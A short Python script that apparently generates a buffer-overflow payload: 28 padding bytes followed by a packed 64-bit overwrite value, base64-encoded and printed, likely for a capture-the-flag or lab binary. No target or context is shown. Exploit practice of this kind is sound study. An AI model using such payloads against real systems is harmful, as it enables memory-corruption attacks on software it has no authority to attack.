
import sys
import struct
import base64

buf = b'FFFFFFFFFFFFFFFFFFFFFFFFFFFF'
buf += struct.pack('<Q', 13100520330138179221)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
